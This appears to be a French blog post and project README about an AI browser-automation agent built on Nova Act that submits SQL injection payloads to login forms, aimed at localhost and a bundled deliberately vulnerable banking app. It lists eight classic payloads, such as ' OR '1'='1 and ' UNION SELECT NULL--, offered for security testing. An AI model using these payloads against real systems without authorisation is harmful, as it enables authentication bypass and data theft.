# 🔐 Tests SQL Injection avec Nova Act 
 
> **Comment j'ai construit un agent intelligent qui teste automatiquement les vulnérabilités SQL Injection en simulant un attaquant réel**

---

## 🎯 Le Problème : Tester la Sécurité Prend du Temps

En tant que développeur soucieux de la sécurité, vous savez que tester manuellement chaque champ de formulaire avec des dizaines de payloads SQL Injection est une tâche fastidieuse, répétitive et chronophage. 

Vous avez probablement vécu cette situation :
- 📝 Copier-coller des payloads un par un
- 🖱️ Cliquer sur "Submit" encore et encore
- 👀 Analyser chaque réponse pour détecter les failles
- 📊 Documenter manuellement chaque résultat

**Et si un agent intelligent pouvait faire tout ça pour vous ?**

---

## 💡 La Solution : Un Agent de Test Automatisé avec Nova Act

J'ai créé un **agent de sécurité autonome** qui utilise Nova Act (la technologie d'automation de navigateur d'Amazon) pour tester automatiquement les applications web contre **SQL Injection**, l'une des vulnérabilités les plus critiques et anciennes du web.

### Ce qui rend cet agent spécial ?

Contrairement aux scanners de sécurité traditionnels qui envoient simplement des requêtes HTTP, cet agent **agit comme un humain** :

✅ Ouvre un vrai navigateur Chrome  
✅ Remplit les formulaires comme le ferait un attaquant  
✅ Clique sur les boutons  
✅ Analyse les réponses en temps réel  
✅ Génère des rapports détaillés en console  

---

## 🏗️ Architecture : Comment Ça Marche ?

### Le Cerveau de l'Agent : Nova Act

Nova Act est une bibliothèque d'automation de navigateur qui utilise l'intelligence artificielle pour comprendre et interagir avec les pages web. Au lieu d'écrire des sélecteurs CSS complexes, vous donnez simplement des **instructions en langage naturel** :

```python
from nova_act import NovaAct

with NovaAct(starting_page="http://localhost:5000") as nova:
    nova.act("""
        Entre ' OR '1'='1 dans le champ username,
        entre ' OR '1'='1 dans le champ password,
        puis clique sur le bouton Sign In
    """)
```

Magique, non ? L'agent comprend le contexte et exécute les actions.

### Le Workflow de Test

Voici ce qui se passe sous le capot lorsque vous lancez l'agent :

```
┌─────────────────────────────────────────────┐
│  1. Chargement de la Configuration          │
│     • API Key depuis .env                   │
│     • Liste des payloads XSS et SQL         │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│  2. Lancement du Navigateur                 │
│     • Chrome en mode visible ou headless    │
│     • Navigation vers la page cible         │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│  3. Injection des Payloads                  │
│     • Itération sur chaque payload          │
│     • Remplissage automatique des champs    │
│     • Soumission du formulaire              │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│  4. Analyse des Résultats                   │
│     • Détection d'erreurs SQL               │
│     • Détection d'exécution JavaScript      │
│     • Bypass d'authentification             │
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│  5. Génération du Rapport                   │
│     • Console output en temps réel          │
│     • Messages détaillés par payload        │
│     • Statistiques de vulnérabilités        │
└─────────────────────────────────────────────┘
```

---

## 🧪 Arsenal de Tests : Les Payloads SQL Injection

### 💉 8 Techniques d'Attaque SQL Injection

L'agent déploie **8 techniques SQL Injection** différentes pour maximiser la détection des failles :

1. **Basic OR Bypass**
   ```sql
   ' OR '1'='1
   ```
   *Bypass classique d'authentification*

2. **Comment Bypass**
   ```sql
   ' OR '1'='1' --
   ```
   *Utilise les commentaires SQL*

3. **Admin Bypass**
   ```sql
   admin' --
   ```
   *Force l'authentification en tant qu'admin*

4. **Hash Comment**
   ```sql
   admin' #
   ```
   *Alternative avec commentaire MySQL*

5. **Simple OR**
   ```sql
   ' OR 1=1--
   ```
   *Condition toujours vraie*

6. **UNION Injection**
   ```sql
   ' UNION SELECT NULL--
   ```
   *Exploite UNION pour extraire des données*

7. **Alternative OR**
   ```sql
   ' OR 'x'='x
   ```
   *Variation de la condition toujours vraie*

8. **Parenthesis Bypass**
   ```sql
   ') OR ('1'='1
   ```
   *Échappe les parenthèses dans la requête*

---

## 🚀 Installation et Démarrage

### Prérequis

```bash
# Python 3.8+
# pip (gestionnaire de packages Python)
# Clé API Nova Act (gratuite sur nova.amazon.com/act)
```

### Installation en 3 Étapes

**1. Cloner le projet**
```bash
git clone https://github.com/votre-repo/nova-act-xss-injection.git
cd nova-act-xss-injection
```

**2. Installer les dépendances**
```bash
pip install -r requirements.txt
```

**3. Configurer la clé API**

Créez un fichier `.env` à la racine du projet :
```bash
NOVA_ACT_API_KEY=votre_clé_api_ici
```

*💡 Obtenez votre clé gratuite sur [nova.amazon.com/act](https://nova.amazon.com/act)*

### Installation de Playwright (Première Utilisation)

Nova Act utilise Playwright sous le capot. Installation one-time :

```powershell
pip install playwright
python -m playwright install chromium
```

---

## 🎮 Utilisation : Mode d'Emploi

### Lancer les Tests (Mode Visuel)

Regardez l'agent travailler en temps réel :

```bash
python nova-xss-sql.py
```

Vous verrez le navigateur Chrome s'ouvrir et l'agent tester automatiquement chaque payload !

### Options Avancées

```bash
# Mode headless (sans interface graphique)
python nova-xss-sql.py --headless

# Cibler une URL personnalisée
python nova-xss-sql.py --target_url http://localhost:8080/WebGoat/login
```

---

## 🎯 Cibles de Test

### Option 1 : Application Vulnérable Incluse (Recommandé)

Le projet inclut **SecureBank**, une application bancaire intentionnellement vulnérable pour l'apprentissage :

```bash
cd vunerable_website
docker build -t vulnerable-webapp .
docker run -p 5000:5000 vulnerable-webapp
```

Accédez à : http://localhost:5000

**Credentials par défaut :**
- Username: `admin` / Password: `password123`
- Username: `john` / Password: `john2024`
 
---

## 🔬 Cas d'Usage Réels

**CI/CD Integration**

Intégrez l'agent dans votre pipeline pour tester chaque commit :

```yaml
# .github/workflows/security-tests.yml
name: Security Tests
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Security Agent
        run: |
          pip install -r requirements.txt
          python nova-xss-sql.py --headless
        env:
          NOVA_ACT_API_KEY: ${{ secrets.NOVA_ACT_API_KEY }}
```


## 🤝 Contribuer

Ce projet est open-source ! Vos contributions sont les bienvenues :

1. **Fork** le repository
2. **Créez** une branche feature (`git checkout -b feature/AmazingFeature`)
3. **Committez** vos changements (`git commit -m 'Add some AmazingFeature'`)
4. **Pushez** vers la branche (`git push origin feature/AmazingFeature`)
5. **Ouvrez** une Pull Request

### Idées de Contributions

- 🐛 Correction de bugs
- 📝 Amélioration de la documentation
- ✨ Nouveaux payloads de test
- 🎨 Amélioration de l'UI console
- 🧪 Tests unitaires

---


## 🎬 Conclusion

En automatisant les tests de sécurité avec Nova Act, j'ai réduit de **95% le temps** nécessaire pour tester une application contre les vulnérabilités SQL Injection.

Ce qui prenait **2 heures de tests manuels** prend désormais **5 minutes** avec l'agent automatisé.

**Et le meilleur ?** L'agent ne se fatigue jamais, ne fait pas d'erreurs et peut tourner 24/7 dans votre CI/CD.

---

## 💬 Questions ? Feedback ?

N'hésitez pas à :
- 🐛 Ouvrir une [issue](https://github.com/votre-repo/nova-act-xss-injection/issues)
- 💬 Démarrer une [discussion](https://github.com/votre-repo/nova-act-xss-injection/discussions)
- ⭐ Star le projet si vous le trouvez utile !

---

### 📜 Licence

Ce projet est sous licence MIT - voir le fichier [LICENSE](LICENSE) pour plus de détails.

---

### 👨‍💻 Auteur

Développé avec ❤️ pour la communauté cybersécurité.

**N'oubliez pas : Avec un grand pouvoir vient une grande responsabilité. Testez éthiquement. 🛡️**

---

*Article publié le 10 novembre 2025*  
*Tags: #cybersecurity #automation #testing #python #nova-act #sql-injection #appsec #devsecops*
